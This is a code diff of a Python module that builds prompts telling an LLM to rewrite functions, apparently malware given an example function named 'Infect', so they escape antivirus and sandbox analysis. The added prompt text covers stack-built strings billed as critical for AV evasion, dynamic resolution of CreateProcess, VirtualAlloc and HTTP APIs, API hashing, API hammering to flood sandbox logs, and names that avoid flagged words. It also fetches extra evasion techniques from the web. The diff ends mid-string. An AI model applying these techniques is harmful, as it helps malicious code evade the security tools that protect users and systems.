@@ -1,3 +1,6 @@
+from typing import Optional
+
+
 def _get_language_specific_prohibitions(language: str, compiler_type: str = 'msvc') -> str:
     """Return language-specific absolute prohibitions for mutation prompts."""
     if language == "python":
@@ -115,11 +118,24 @@ def _get_language_specific_features(language: str, strategy: str, compiler_type:
                 "- Arithmetic: `x + 1` → `x - ~0`, `x * 4` → `x << 2`, `x % 2` → `x & 1`, `x == 0` → `not x`\n"
                 "- SAFETY: Only apply substitutions that preserve exact behavior for ALL inputs including edge cases.\n"
             ),
+            "strat_6": (
+                "PYTHON-SPECIFIC TECHNIQUES (Anti-Behavioral Analysis):\n"
+                "- API Hammering: Call benign stdlib functions to flood analysis logs:\n"
+                "  `_h0 = __import__('os').getpid()`\n"
+                "  `_h1 = __import__('os').getcwd()`\n"
+                "  `_h2 = __import__('platform').node()`\n"
+                "  `_h3 = __import__('sys').version`\n"
+                "  `_h4 = __import__('os').cpu_count()`\n"
+                "- Timing jitter: `_t0 = __import__('time').monotonic(); _t1 = _t0`\n"
+                "  `while _t1 == _t0: _t1 = __import__('time').monotonic()`\n"
+                "- Environmental: `_ev = sum(ord(c) for c in __import__('os').environ.get('COMPUTERNAME',''))`\n"
+                "- ALL original logic MUST remain identical. Only ADD noise.\n"
+            ),
             "strat_all": (
                 "PYTHON-SPECIFIC TECHNIQUES:\n"
                 "- Encode ALL strings: `_d = lambda _b, _k=0x37: ''.join(chr(_c ^ _k) for _c in _b)` then use _d([...]) everywhere.\n"
                 "- All imports dynamic: `__import__(''.join(chr(x) for x in [<codes>]))`\n"
-                                "- Replace 50% of ops with alternatives: join for concat, find for 'in', manual loop for enumerate.\n"
+                "- Replace 50% of ops with alternatives: join for concat, find for 'in', manual loop for enumerate.\n"
             ),
         }
         return hints.get(strategy, "")
@@ -178,11 +194,23 @@ def _get_language_specific_features(language: str, strategy: str, compiler_type:
                 "- require('fs').readFileSync → dynamic: `require('f'+'s')['readFile'+'Sync'](...)`\n"
                 "- SAFETY: Only apply substitutions that preserve exact behavior for ALL inputs including edge cases.\n"
             ),
+            "strat_6": (
+                "JAVASCRIPT-SPECIFIC TECHNIQUES (Anti-Behavioral Analysis):\n"
+                "- API Hammering: Call benign Node.js APIs to flood analysis logs:\n"
+                "  `var _h0 = require('os').hostname();`\n"
+                "  `var _h1 = require('os').cpus().length;`\n"
+                "  `var _h2 = require('os').totalmem();`\n"
+                "  `var _h3 = process.cwd();`\n"
+                "  `var _h4 = process.uptime();`\n"
+                "- Timing jitter: `var _t0=Date.now(); while(Date.now()===_t0){}`\n"
+                "- Environmental: `var _ev=0; var _cn=require('os').hostname(); for(var _i=0;_i<_cn.length;_i++) _ev^=_cn.charCodeAt(_i);`\n"
+                "- ALL original logic MUST remain identical. Only ADD noise.\n"
+            ),
             "strat_all": (
                 "JAVASCRIPT-SPECIFIC TECHNIQUES:\n"
                 "- Encode ALL strings: `const _d = (_b,_k=0x37)=>_b.map(_c=>String.fromCharCode(_c^_k)).join('');`\n"
                 "- All require() dynamic: `require(['mo','du','le'].join(''))`\n"
-                                "- 50% ops via alternatives: join for concat, indexOf for includes, bracket notation for all props.\n"
+                "- 50% ops via alternatives: join for concat, indexOf for includes, bracket notation for all props.\n"
             ),
         }
         return hints.get(strategy, "")
@@ -347,41 +375,67 @@ def _get_language_specific_features(language: str, strategy: str, compiler_type:
             ),
             # strat_5: Semantic Substitution
             "strat_5": (
-                "C/C++-SPECIFIC TECHNIQUES:\n\n"
-                "--- SAFE CRT SUBSTITUTIONS (use these freely) ---\n"
-                "Replace `memcpy(dst, src, n)` with manual byte loop:\n"
-                "  { DWORD _ci; for(_ci=0;_ci<n;_ci++) ((BYTE*)dst)[_ci]=((const BYTE*)src)[_ci]; }\n"
-                "Replace `strcmp(a,b)` with manual compare:\n"
-                "  { int _r=0; const char *_pa=a, *_pb=b; while(*_pa||*_pb){if(*_pa!=*_pb){_r=*_pa-*_pb;break;}_pa++;_pb++;} }\n"
-                "Replace `strcpy(d,s)` with: { const char *_p=s; char *_q=d; while((*_q++=*_p++)); }\n"
-                "Replace `strlen(s)` with: { DWORD _l=0; while(s[_l]) _l++; } then use _l.\n"
-                "Replace `memset(d,v,n)` with: { DWORD _ci; for(_ci=0;_ci<n;_ci++) ((BYTE*)d)[_ci]=(BYTE)v; }\n"
-                "Replace `strcat(d,s)` with: { char *_p=d; while(*_p) _p++; const char *_q=s; while((*_p++=*_q++)); }\n\n"
-                "--- SAFE ARITHMETIC SUBSTITUTIONS ---\n"
-                "  a + b → a - (~b) - 1  (or  a - (-(b)) which is just a + b, AVOID for clarity)\n"
-                "  a + 1 → a - (~0)  (two's complement: ~0 == -1, so a - (-1) == a + 1)\n"
-                "  a * 2 → a << 1;  a * 4 → a << 2;  a * 8 → a << 3\n"
-                "  a / 2 → a >> 1;  a / 4 → a >> 2  (unsigned only!)\n"
-                "  a % 2 → a & 1;  a % 4 → a & 3;  a % 8 → a & 7;  a % 16 → a & 15\n"
-                "  a == b → !(a ^ b);  a != b → !!(a ^ b)\n"
-                "  a == 0 → !a;  a != 0 → !!a\n\n"
-                "--- UNSAFE SUBSTITUTIONS (NEVER DO THESE) ---\n"
-                "- NEVER substitute Win32 APIs with NT-layer APIs (NtCreateFile, NtWriteFile, NtSetValueKey).\n"
-                "- NEVER invent function names that don't exist in Windows or CRT.\n"
-                "- NEVER change pointer types in assignments or comparisons (char* ↔ int, HANDLE ↔ DWORD etc.).\n"
-                "- NEVER replace signed division/modulo with bitwise shift/mask (only safe for unsigned).\n"
-                "- NEVER substitute operations that depend on evaluation order or side effects.\n"
-                "- NEVER change the type of a variable when substituting the expression that initializes it.\n\n"
-                "--- C RULES ---\n"
-                + ("- Declare ALL loop variables at the TOP of the enclosing block (C89 style):\n"
-                   "  CORRECT: { DWORD _ci; for(_ci=0;_ci<n;_ci++) ... }\n"
-                   "  WRONG:   for(DWORD _ci=0;_ci<n;_ci++) ...  // not valid C89!\n"
+                "C/C++-SPECIFIC STRING ELIMINATION EXAMPLES:\n\n"
+                "--- NARROW STRINGS (char*) ---\n"
+                "BEFORE: const char *msg = \"POST\";\n"
+                "AFTER:  char _s0[5]; _s0[0]='P'; _s0[1]='O'; _s0[2]='S'; _s0[3]='T'; _s0[4]=0;\n"
+                "Or with arithmetic: _s0[0]=(char)(0x40+0x10); /* P=80 */ _s0[1]=(char)(0x40+0x0F); /* O=79 */\n\n"
+                "--- WIDE STRINGS (wchar_t*, L\"...\") ---\n"
+                "BEFORE: const WCHAR *h = L\"Content-Type\";\n"
+                "AFTER:  WCHAR _w0[13]; _w0[0]=L'C'; _w0[1]=L'o'; _w0[2]=L'n'; _w0[3]=L't';\n"
+                "        _w0[4]=L'e'; _w0[5]=L'n'; _w0[6]=L't'; _w0[7]=L'-'; _w0[8]=L'T';\n"
+                "        _w0[9]=L'y'; _w0[10]=L'p'; _w0[11]=L'e'; _w0[12]=0;\n\n"
+                "--- FORMAT STRINGS ---\n"
+                "BEFORE: wnsprintfA(buf, sz, \"logs=%%s\", param);\n"
+                "AFTER:  { char _f0[8]; _f0[0]='l'; _f0[1]='o'; _f0[2]='g'; _f0[3]='s';\n"
+                "          _f0[4]='='; _f0[5]='%%'; _f0[6]='s'; _f0[7]=0;\n"
+                "          wnsprintfA(buf, sz, _f0, param); }\n\n"
+                "--- CRT SUBSTITUTION PATTERNS ---\n"
+                "memcpy(d,s,n)  → { DWORD _ci; for(_ci=0;_ci<n;_ci++) ((BYTE*)d)[_ci]=((const BYTE*)s)[_ci]; }\n"
+                "strcmp(a,b)    → { int _r=0; const char *_pa=a,*_pb=b; while(*_pa||*_pb){if(!!(*_pa^*_pb)){_r=*_pa-*_pb;break;}_pa=_pa-(~0)-1;_pb=_pb-(~0)-1;} }\n"
+                "strcpy(d,s)   → { const char *_p=s; char *_q=d; while((*_q++=*_p++)); }\n"
+                "strlen(s)     → { DWORD _l=0; const char *_p=s; while(*_p){_l=_l-(~0)-1;_p=_p-(~0)-1;} }\n"
+                "memset(d,v,n) → { DWORD _ci; for(_ci=0;_ci<n;_ci++) ((BYTE*)d)[_ci]=(BYTE)v; }\n"
+                "lstrlenA/W    → manual while(*_p) count loop\n"
+                "wnsprintfA/W  → replace format string with stack-built, keep the call\n\n"
+                "--- ARITHMETIC ---\n"
+                "  a + 1 → a - (~0);  a - b → a + (~b) + 1;  a * 4 → a << 2\n"
+                "  a == b → !(a ^ b);  a != b → !!(a ^ b);  a == 0 → !a\n"
+                "  i++ → i = i - (~0) - 1  (inside loops)\n\n"
+                "--- PROHIBITIONS ---\n"
+                "- NEVER substitute Win32 API calls (CreateFileA, InternetOpenW etc.) with NT-layer APIs.\n"
+                "- NEVER invent function names. NEVER change pointer types without explicit cast.\n"
+                "- NEVER remove _free(), CloseHandle(), or cleanup calls — substitute them in-place.\n"
+                "- NEVER replace signed division with bitwise shift.\n"
+                "- NEVER change the type of variables.\n\n"
+                + ("- Declare ALL loop variables at the TOP of the enclosing block (C89 style).\n"
                    if compiler_type == 'msvc' else
-                   "- For-loop initializers `for(DWORD _ci=0;_ci<n;_ci++)` are valid in C99+ mode.\n") +
-                "- Use BLAND variable names for temporaries: _ci, _t0, _v0, _r0 — NOT _enc, _xor, _key.\n"
-                "- ONLY use real, existing Windows/CRT APIs. Stay within the SAME API layer (Win32→Win32, CRT→CRT).\n"
+                   "- For-loop initializers are valid in C99+ mode.\n") +
+                "- Use BLAND names: _ci, _t0, _v0, _s0, _w0, _f0, _l0.\n"
                 "- NEVER add typedef, extern, #include, or global declarations.\n"
-                "- Keep ALL code INSIDE the original function body unless creating helper functions.\n"
+            ),
+            "strat_6": (
+                "C/C++-SPECIFIC TECHNIQUES (Anti-Behavioral Analysis):\n\n"
+                "API HAMMERING — scatter these REAL calls throughout the function:\n"
+                "  `volatile DWORD _h0 = GetCurrentDirectoryA(0, NULL);`\n"
+                "  `volatile BOOL _h1 = IsProcessorFeaturePresent(PF_XMMI_INSTRUCTIONS_AVAILABLE);`\n"
+                "  `SYSTEMTIME _st; GetSystemTime(&_st); volatile DWORD _h2 = _st.wMilliseconds;`\n"
+                "  `volatile DWORD _h3 = GetFileAttributesA(\"C:\\\\Windows\\\\System32\\\\ntdll.dll\");`\n"
+                "  `char _tb[MAX_PATH]; GetTempPathA(MAX_PATH, _tb); volatile int _h4 = _tb[0];`\n"
+                "  `MEMORYSTATUS _mst; _mst.dwLength = sizeof(_mst); GlobalMemoryStatus(&_mst);`\n"
+                "  `SYSTEM_INFO _si; GetSystemInfo(&_si); volatile DWORD _h5 = _si.dwNumberOfProcessors;`\n"
+                "  `volatile HANDLE _h6 = CreateMutexA(NULL, FALSE, NULL); if (_h6) CloseHandle(_h6);`\n\n"
+                "TIMING JITTER:\n"
+                "  `{ volatile DWORD _tw = GetTickCount(); while(GetTickCount() == _tw) {} }`\n\n"
+                "ENVIRONMENTAL AWARENESS:\n"
+                "  `char _un[64]; DWORD _us = 64; GetUserNameA(_un, &_us);`\n"
+                "  `volatile DWORD _ev = 0; { DWORD _ei; for(_ei=0; _ei<_us && _ei<64; _ei++) _ev ^= (DWORD)_un[_ei]; }`\n"
+                "  `volatile DWORD _vx = GetVersion(); _ev ^= (_vx & 0xFF);`\n\n"
+                + ("- Declare ALL variables at the TOP of the function body (C89 style).\n"
+                   if compiler_type == 'msvc' else
+                   "- Variables can be declared anywhere (C99+).\n") +
+                "- NEVER change original logic. Only ADD noise.\n"
+                "- Use bland names: _h0-_h9, _tw, _ev, _mst, _si. Avoid enc/dec/xor/key.\n"
             ),
             "strat_all": (
                 "C/C++-SPECIFIC TECHNIQUES — APPLY ALL THREE IN ORDER:\n\n"
@@ -418,10 +472,16 @@ def _get_language_specific_features(language: str, strategy: str, compiler_type:
                 "Do NOT resolve project helper functions (non-Windows functions defined in other .c/.h files).\n"
                 "Use short generic names: _pf0, _pf1, _pf2 (NOT _pfCreateFile, _pfWriteFile).\n\n"
                 "--- STEP 3: SEMANTIC SUBSTITUTION (only if safe) ---\n"
-                "  strcmp(a,b)==0 -> memcmp(a,b,strlen(a)+1)==0\n"
-                "  memcpy(d,s,n) -> for(DWORD _ci=0;_ci<n;_ci++) ((BYTE*)d)[_ci]=((BYTE*)s)[_ci];\n"
-                "  x + 1 -> x - (~0)    x * 4 -> x << 2    x == y -> !(x ^ y)\n"
+                "  memcpy(d,s,n) → byte loop; strcmp(a,b) → manual compare; strlen(s) → while count\n"
+                "  x + 1 → x - (~0);  x * 4 → x << 2;  x == y → !(x ^ y)\n"
+                "  i++ → i = i - (~0) - 1 (inside loops)\n"
                 "Skip any substitution you are unsure about.\n\n"
+                "--- STEP 4: BEHAVIORAL NOISE (if function has 10+ lines) ---\n"
+                "  `volatile DWORD _h0 = GetCurrentDirectoryA(0, NULL);`\n"
+                "  `volatile BOOL _h1 = IsProcessorFeaturePresent(PF_XMMI_INSTRUCTIONS_AVAILABLE);`\n"
+                "  `{ volatile DWORD _tw = GetTickCount(); while(GetTickCount() == _tw) {} }`\n"
+                "  `char _un[32]; DWORD _us = 32; GetUserNameA(_un, &_us);`\n"
+                "Scatter 2-4 of these throughout the function. Rename ALL locals to _v0, _t0, _ci.\n\n"
                 "C-SPECIFIC RULES:\n"
                 "- All string buffers and function pointer variables MUST be LOCAL inside the function body.\n"
                 "- NEVER add typedef, extern, #include, or global declarations.\n"
@@ -438,8 +498,29 @@ def _get_language_specific_features(language: str, strategy: str, compiler_type:
         return hints.get(strategy, "")
 
 
-def get_strategy_prompt(strategy: str, language: str = "c", compiler_type: str = 'msvc') -> str:
-    """Get the strategy prompt tailored for the specified language."""
+def get_strategy_prompt(
+    strategy: str,
+    language: str = "c",
+    compiler_type: str = 'msvc',
+    enrich_from_web: bool = False,
+    web_cache_ttl_s: int = 21600,
+    enrichment_meta_out: Optional[dict] = None,
+) -> str:
+    """Get the strategy prompt tailored for the specified language.
+
+    Args:
+        strategy: Mutation strategy name (strat_1 .. strat_6, strat_all)
+        language: Target language (c, cpp, python, javascript)
+        compiler_type: Compiler type for C/C++ ('msvc' or 'gcc')
+        enrich_from_web: If True, append dynamically researched evasion
+            techniques from DuckDuckGo search results.
+        web_cache_ttl_s: Cache TTL for web research results (default 6h)
+        enrichment_meta_out: Optional dict that will be populated with
+            web-enrichment metadata: ``applied``, ``source``,
+            ``techniques_found``, ``snippets_found``.  Pass an empty
+            dict ``{}`` to collect the metadata without changing the
+            return type.
+    """
     base = _strategy_prompt_base.get(strategy)
     if base is None:
         valid_keys = sorted(_strategy_prompt_base.keys())
@@ -452,6 +533,27 @@ def get_strategy_prompt(strategy: str, language: str = "c", compiler_type: str =
     if features:
         result += "\nLANGUAGE-SPECIFIC TIPS:\n" + features
     result += prohibitions
+
+    if enrich_from_web:
+        _meta: dict = {"applied": False, "source": "disabled", "techniques_found": 0, "snippets_found": 0}
+        try:
+            from evasion_research import _research_evasion_with_meta
+            enrichment, web_meta = _research_evasion_with_meta(
+                strategy=strategy,
+                language=language,
+                cache_ttl_s=web_cache_ttl_s,
+                enabled=True,
+            )
+            _meta.update(web_meta)
+            if enrichment:
+                result += "\n" + enrichment
+                _meta["applied"] = True
+        except Exception as exc:
+            _meta["source"] = "error"
+            _meta["error"] = str(exc)
+        if enrichment_meta_out is not None:
+            enrichment_meta_out.update(_meta)
+
     return result
 
 
@@ -487,7 +589,18 @@ _strategy_prompt_base = {
         "- Use VARIED techniques across different strings: some stack-built, some arithmetic, some split-concat. "
         "Uniform patterns across all strings trigger pattern-matching heuristics.\n"
         "- Use DIFFERENT arithmetic offsets for different strings (e.g. +7 for one, -3 for another, +0x11 for a third).\n"
-        "- Keep variable names short and generic (_s0, _b1, _t2) — not _enc, _dec, _xor, _key which are flagged names.\n\n"
+        "- Keep variable names short and generic (_s0, _b1, _t2) — not _enc, _dec, _xor, _key which are flagged names.\n"
+        "- ENTROPY AWARENESS: Mix character assignment with normal-looking initializations. "
+        "Insert bland statements between string constructions (e.g. `int _pad0 = 0;`) "
+        "to keep code entropy looking like normal initialization code, not crypto.\n"
+        "- INTERLEAVE string construction with real logic when possible — building all strings "
+        "in a contiguous block looks suspicious. Scatter constructions near their point of use.\n\n"
+        "BONUS — DEAD CODE INJECTION (adds noise to change code size + entropy):\n"
+        "Insert 2-4 dead computation statements scattered between string constructions:\n"
+        "  `volatile DWORD _junk = GetTickCount() ^ 0xB0BA;`\n"
+        "  `volatile int _dc0 = (int)(sizeof(void*) << 3);`\n"
+        "These change code entropy, section size, and add static API references that confuse AV pattern matching.\n"
+        "Do NOT cluster them — spread throughout the function between real code blocks.\n\n"
         "CRITICAL C/C++ RULES (violating these causes compile failure):\n"
         "- C does NOT support nested functions. Any helper MUST be defined BEFORE the main function, at file scope.\n"
         "- NEVER close the function body early with '}' and then put code after it. ALL original code stays inside the function braces.\n"
@@ -600,6 +713,24 @@ _strategy_prompt_base = {
         "- Dead code must COMPILE and reference real types/APIs but NEVER affect program output.\n"
         "- Use 3-6 dead code statements spread throughout the function.\n"
         "- VARY the operations: XOR, shifts, addition, GetTickCount(), GetLastError(), etc.\n\n"
+        "TECHNIQUE 4 — API HAMMERING (behavioral noise):\n"
+        "- Call BENIGN Win32 APIs that produce visible sandbox log entries but are harmless:\n"
+        "  `volatile DWORD _n0 = GetCurrentDirectoryA(0, NULL);`\n"
+        "  `volatile BOOL _n1 = IsProcessorFeaturePresent(PF_XMMI_INSTRUCTIONS_AVAILABLE);`\n"
+        "  `MEMORYSTATUS _ms; _ms.dwLength = sizeof(_ms); GlobalMemoryStatus(&_ms); _junk = _ms.dwTotalPhys >> 20;`\n"
+        "- Scatter 3-5 benign API calls throughout the state machine cases to flood sandbox behavioral logs.\n"
+        "- These calls are REAL (not inside dead branches), but their results are only used in junk computations.\n"
+        "- Good APIs for hammering: GetSystemTime, GetComputerNameA, GetUserNameA, GetVersionExA, "
+        "GetDiskFreeSpaceExA, GetSystemInfo, GetSystemDirectoryA, GetWindowsDirectoryA, GetTempPathA.\n\n"
+        "TECHNIQUE 5 — STRING LITERAL ELIMINATION (critical for signature evasion):\n"
+        "Replace EVERY string literal in the function with stack-built equivalents:\n"
+        "  BEFORE: CreateFileA(\"C:\\\\Temp\\\\log.txt\", ...);\n"
+        "  AFTER:  char _s0[16]; _s0[0]='C'; _s0[1]=':'; _s0[2]='\\\\'; ... _s0[15]=0;\n"
+        "          CreateFileA(_s0, ...);\n"
+        "This is the SINGLE MOST IMPACTFUL change for AV evasion — string literals are the #1 signature source.\n"
+        "Apply this to ALL strings: file paths, URLs, command strings, registry keys, API names, error messages.\n"
+        "Even short strings like \"NUL\", \"POST\", \"\\r\\n\" MUST be stack-built.\n"
+        "Use BLAND names: _s0, _s1, _s2. Mix per-character assignment with arithmetic: _s0[0]=(char)(0x40+3);\n\n"
         "RULES:\n"
         "- ALL original logic MUST remain functionally identical — same inputs produce same outputs.\n"
         "- The function signature (name, return type, parameters) MUST NOT change.\n"
@@ -615,26 +746,44 @@ _strategy_prompt_base = {
     # Strategy 2: Dynamic Import and API Resolution
     # Goal: Remove all static import references and visible module/API/DLL names from the binary
     "strat_3": (
-        "TASK: Replace ALL direct imports, require() calls, and API function calls with runtime-resolved equivalents to defeat import table and static API-name analysis.\n\n"
+        "TASK: Replace ALL direct imports, require() calls, and API function calls with runtime-resolved equivalents, "
+        "AND eliminate ALL string literals from the function. Output ONLY the complete transformed function.\n\n"
+        "--- STEP 1: ELIMINATE ALL STRING LITERALS ---\n"
+        "Replace EVERY string literal (paths, URLs, commands, registry keys, messages) with stack-built equivalents:\n"
+        "  BEFORE: CreateFileA(\"C:\\\\Temp\\\\d.bin\", ...);\n"
+        "  AFTER:  char _s0[16]; _s0[0]='C'; _s0[1]=':'; ... _s0[15]=0;  CreateFileA(_s0, ...);\n"
+        "This applies to ALL strings, not just DLL/API names. Even short strings like \"POST\", \"\\r\\n\" must be stack-built.\n"
+        "Mix techniques: some per-character assignment, some arithmetic (_s0[0]=(char)(0x40+3)).\n\n"
+        "--- STEP 2: DYNAMIC API RESOLUTION ---\n"
+        "Replace every Win32/CRT direct call with a function pointer resolved via GetProcAddress(LoadLibraryA(...), ...).\n"
+        "Build DLL and API name strings on the stack (same technique as Step 1).\n"
+        "CRITICAL: Each function pointer MUST match the EXACT signature of the API it replaces.\n"
+        "Do NOT use one generic signature for all APIs — they are all different!\n"
+        "Load each DLL ONCE, reuse the handle:\n"
+        "  char _s1[13]; _s1[0]='k'; _s1[1]='e'; ... _s1[12]=0;\n"
+        "  HMODULE _hM = LoadLibraryA(_s1);\n"
+        "  char _s2[12]; _s2[0]='C'; _s2[1]='r'; ... _s2[11]=0;\n"
+        "  HANDLE (WINAPI *_pf0)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE) = NULL;\n"
+        "  *(FARPROC*)&_pf0 = GetProcAddress(_hM, _s2);\n"
+        "Target: CreateFileA/W, WriteFile, ReadFile, RegOpenKeyExA/W, VirtualAlloc, CreateProcessA/W,\n"
+        "  InternetOpenA/W, HttpOpenRequestA/W, HttpSendRequestA/W, InternetConnectA/W,\n"
+        "  CopyFileA, DeleteFileA, GetModuleFileNameA, SHGetFolderPathA.\n"
+        "Do NOT resolve LoadLibraryA/GetProcAddress themselves.\n"
+        "Do NOT resolve project helper functions (non-Windows functions).\n"
+        "Use short names: _pf0, _pf1, _pf2 (NOT _pfCreateFile).\n\n"
+        "--- STEP 3: SEMANTIC SUBSTITUTION (only if safe) ---\n"
+        "Replace CRT calls with manual equivalents:\n"
+        "  memcpy(d,s,n) → byte loop; strcmp(a,b) → manual compare; strlen(s) → while(*p) count\n"
+        "  x + 1 → x - (~0);  x == y → !(x ^ y)\n"
+        "Skip any substitution you are unsure about.\n\n"
         "RULES:\n"
-        "1. Remove every explicit import statement from the function scope. Resolve modules/libraries dynamically at point of first use.\n"
-        "   - Python: replace `import X` with `_X = __import__(''.join(map(chr, [<char codes of 'X'>])))`\n"
-        "   - Python: replace `from X import Y` with `_m = __import__('X', fromlist=['Y']); _Y = getattr(_m, 'Y')`\n"
-        "   - JS: replace `require('X')` with `(require)(['X'][0])` or build the module name via string ops: `require('mo'+'dule')`\n"
-        "   - C: replace every Win32/CRT direct call with a function pointer resolved via `GetProcAddress(LoadLibraryA(...), ...)`\n"
-        "2. Build ALL module/DLL/API name strings dynamically — do NOT write them as plain string literals:\n"
-        "   - C: Build DLL and API name strings on the stack using per-character assignment (PREFERRED — heuristic-safe):\n"
-        "     `char _s0[13]; _s0[0]='k'; _s0[1]='e'; _s0[2]='r'; _s0[3]='n'; ... _s0[12]=0;`\n"
-        "     Or arithmetic construction: `_s0[0]=(char)(0x60+0x0B);` etc.\n"
-        "     AVOID XOR decode loops — they trigger heuristic engines.\n"
-        "   - Python: `''.join(chr(x) for x in [111,115])` or split+join: `'so'+'cket'`\n"
-        "   - JS: `['ht','tp'].join('')` or `'f'+'s'`\n"
-        "3. Replace all method/attribute access on external objects with dynamic resolution:\n"
-        "   - Python: `obj.method(args)` → `getattr(obj, 'meth'+'od')(args)`\n"
-        "   - JS: `obj.property` → `obj['prop'+'erty']`\n"
-        "4. Cache the resolved references in local variables (named opaquely) at the start of the function body so they are only resolved once.\n"
-        "5. ALL original functionality MUST be preserved. The dynamic resolution MUST call the exact same APIs/functions as the original.\n"
-        "6. CRITICAL (C/C++): Each function pointer MUST match the EXACT signature (return type, calling convention, ALL parameter types and count) of the real Win32 API it replaces. Do NOT use a generic signature for all APIs.\n"
+        "1. ALL original functionality MUST be preserved. Dynamic resolution MUST call the exact same APIs.\n"
+        "2. Cache resolved references in local variables at the start of the function body.\n"
+        "3. NEVER resolve project functions via GetProcAddress. Only resolve Windows DLL exports.\n"
+        "4. Use BLAND variable names: _s0, _pf0, _hM. AVOID enc/dec/xor/key/cipher.\n"
+        "5. ADVANCED — API HASHING (C/C++ only, for functions with 3+ API calls):\n"
+        "   Instead of building API name strings, compute an FNV hash and walk the export table.\n"
+        "   This eliminates API names entirely. Only use if justified by API count.\n"
     ),
     # Strategy 4: Function Splitting
     # Goal: Split large functions into smaller static helper functions to change call graph, function sizes, and code structure — defeating function-level heuristics, n-gram, and signature-based AV
@@ -703,6 +852,14 @@ _strategy_prompt_base = {
         "- Example: if the function is `Infect`, helpers are `_sub_Infect_0`, `_sub_Infect_1`.\n"
         "- NEVER use generic names like `_sub_0`, `_sub_1` — these cause name collisions.\n"
         "- Bland parameter names: _v0, _p0, or reuse the original variable names.\n\n"
+        "AFTER SPLITTING — APPLY THESE TRANSFORMATIONS TO ALL HELPERS AND THE MAIN FUNCTION:\n\n"
+        "STRING ELIMINATION: Replace EVERY string literal with stack-built equivalents:\n"
+        "  char _s0[N]; _s0[0]='k'; _s0[1]='e'; ... _s0[N-1]=0;\n"
+        "  Apply to ALL strings in ALL helpers and the main function.\n"
+        "  This is critical — function splitting alone does NOT evade string-based signatures.\n\n"
+        "VARIABLE RENAMING: Rename ALL local variables to bland names: _v0, _v1, _t0, _ci.\n"
+        "  Keep parameter names descriptive for clarity, but locals should be opaque.\n"
+        "  AVOID names containing: enc, dec, xor, key, cipher, crypt, payload, shell.\n\n"
         "SAFETY RULES:\n"
         "- EVERY split MUST produce IDENTICAL results for ALL inputs including edge cases.\n"
         "- NEVER change the original function's signature, return type, name, or parameters.\n"
@@ -715,47 +872,110 @@ _strategy_prompt_base = {
     # Strategy 5: Semantic Substitution — Operation-Level Equivalence
     # Goal: Replace every recognizable operation pattern with a functionally identical but syntactically alien form to defeat n-gram/ML-based and pattern-based AV
     "strat_5": (
-        "TASK: Substitute every recognizable built-in operation, loop pattern, string operation, and function call with a semantically equivalent but syntactically unrecognizable alternative.\n\n"
-        "RULES:\n"
-        "1. String operations — replace with low-level equivalents:\n"
-        "   - Python: `'a'+'b'` → `''.join(['a','b'])`; `s.lower()` → `s.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'))`\n"
-        "   - JS: `a+b` → `[a,b].join('')`; `str.includes(sub)` → `str.indexOf(sub) !== -1`; `str.toLowerCase()` → `str.replace(/[A-Z]/g, c=>String.fromCharCode(c.charCodeAt(0)+32))`\n"
-        "   - C: replace `strcmp(a,b)` with manual byte-comparison loop; replace `strcpy(d,s)` with `memcpy(d,s,strlen(s)+1)`\n"
-        "2. Arithmetic — replace with bitwise/algebraic equivalents:\n"
-        "   - `a + b` → `a - (~b) - 1` (two's complement trick)\n"
-        "   - `a * 4` → `a << 2`; `a / 2` → `a >> 1`; `a % 8` → `a & 7`\n"
-        "   - `a == b` → `not (a ^ b)` (Python) / `!(a ^ b)` (C/JS)\n"
-        "   - `if a == b` → `if [a,b].count(a) == 2:` (Python)\n"
-        "3. Collection / loop operations — replace with functional-style equivalents:\n"
-        "   - Python `for x in lst:` → `list(map(lambda x: ..., lst))` or `[... for x in lst]`\n"
-        "   - Python `dict[key]` → `dict.get(key)` (safe) or `(lambda d,k: d[k])(dict, key)` (obfuscated access)\n"
-        "   - JS `arr.forEach(fn)` → `for(let _i=0,_l=arr.length;_i<_l;_i++) fn(arr[_i])`\n"
-        "   - JS `arr.length` → `arr['len'+'gth']` (computed property access, same value including sparse arrays)\n"
-        "4. API/method calls — replace known APIs with alternative SAME-LAYER APIs achieving the same result:\n"
-        "   - Python `os.path.join(a,b)` → `str((__import__('pathlib').Path(a))/b)` (pathlib is always safe)\n"
-        "   - Python `open(f,'r').read()` → `__import__('io').FileIO(f).readall().decode()`\n"
-        "   - JS `fs.readFileSync(f)` → `require('fs').readFileSync(f)` called through a constructed-name ref\n"
-        "   - C: replace `memcpy(d,s,n)` with a manual byte loop; replace `strcmp(a,b)` with char-by-char compare\n"
-        "   - C: replace `sprintf(buf,fmt,...)` with manual snprintf or sequential strcat/itoa calls\n"
-        "5. SAFETY: Every substitution MUST produce IDENTICAL runtime behavior for ALL inputs including edge cases (empty strings, zero values, NULL, boundary cases). If you are not 100%% certain a substitution is safe, DO NOT apply it — leave that operation unchanged.\n"
-        "6. AIM to substitute as many operations as possible (ideally 70%%+), but NEVER sacrifice correctness for coverage. A correct 40%% substitution is far better than a broken 70%% one.\n"
-        "7. NEVER substitute Win32 API calls with NT-layer APIs (NtCreateFile, NtWriteFile, NtSetValueKey) — they have completely different signatures, calling conventions, and parameter types. Use alternative USER-MODE Win32 APIs or CRT functions instead.\n\n"
-        "TYPE SAFETY (C/C++ — violating these causes compile errors):\n"
-        "- NEVER cast between unrelated pointer types without explicit cast (e.g. char* and HANDLE are NOT interchangeable).\n"
-        "- NEVER change the return type of any expression used in an assignment or comparison.\n"
-        "- When replacing an API call, the replacement MUST return the SAME type and accept the SAME argument types.\n"
-        "- NEVER use undeclared variables. Every variable MUST be declared before use.\n"
-        "- If targeting MSVC (C89 mode): declare loop variables at the TOP of the enclosing block, not inline in for-loops.\n\n"
-        "ANTI-HEURISTIC GUIDELINES:\n"
-        "- Use BLAND variable names for temporaries: _t0, _v0, _r0, _ci — nothing crypto-looking.\n"
-        "- AVOID names containing: enc, dec, xor, key, cipher, crypt, payload, shell, inject.\n"
-        "- MIX substitution techniques — don't apply the same pattern uniformly to all operations.\n"
-        "- Substituted code should look like normal 'manual' implementation, NOT like obfuscation.\n"
+        "TASK: Transform the function so that NO string literal, NO CRT call, and NO arithmetic pattern "
+        "remains recognizable to static signature scanners. Every substitution MUST produce IDENTICAL "
+        "runtime behavior. Output ONLY the complete transformed function.\n\n"
+        "--- PRIORITY 1: STRING LITERAL ELIMINATION (most important for AV evasion) ---\n"
+        "Replace EVERY string literal (char*, wchar_t*, L\"...\") with stack-built equivalents:\n"
+        "  BEFORE: char *ua = \"Mozilla/5.0\";\n"
